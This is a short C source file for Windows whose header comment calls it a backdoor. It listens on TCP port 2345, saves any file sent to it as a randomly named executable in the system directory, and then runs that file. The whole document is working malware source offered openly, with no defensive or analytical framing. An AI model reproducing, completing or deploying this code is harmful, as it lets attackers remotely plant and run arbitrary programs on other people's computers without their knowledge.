/*************************
* Opens up port 2345.
* Backdoor that accepts
* remotely sent exe files
* saves them as a random 
* filename to system dir
* then executes them :)
*
**************************/
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#pragma comment (lib,"ws2_32.lib") 
#define BACKLOG 5

#define PORT 2345

void retrieve_file(int sock)
{
	int i, j;
	HANDLE hFile=NULL;
	char path[MAX_PATH], buf[1024];
	DWORD dw;

	srand(GetTickCount());
char random[MAX_PATH];

int e,d;
d = 3 + (rand() % 10);
		for (e=0; e<d; e++)
			random[e] = 'a' + (rand() % 26);
	
		char fslash[260]="//";
		GetSystemDirectory(path,sizeof(path));
strcat(path,fslash);
strcat(path,random);
strcat(path,".exe");

	


	hFile = CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
		hFile = NULL;
		goto drop;
	}

	for (i=0;;) {
		j = recv(sock, buf, sizeof(buf), 0);
		if (j <= 0) break;
		i += j;
		WriteFile(hFile, buf, j, &dw, 0);
		
	}
	CloseHandle(hFile);
ShellExecute(NULL,"open",path,NULL,NULL,SW_SHOW); 
	closesocket(sock);		
	return;

drop:	closesocket(sock);
	if (hFile != NULL) 
	return;
}

DWORD _stdcall listening(LPVOID pv)

{

  int sin_size;
  int socket1;
  int socket_accept;
  struct sockaddr_in server;
  struct sockaddr_in client;
 socket1 = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_port = htons(PORT);
  server.sin_addr.s_addr = INADDR_ANY;
  bind(socket1,(struct sockaddr *)&server,sizeof(struct sockaddr));
 listen(socket1,BACKLOG);
  while(1){
     sin_size = sizeof(struct sockaddr_in);
    socket_accept = accept(socket1, (struct sockaddr *)&client,&sin_size);


retrieve_file(socket_accept);
	return 0;
    
}
}

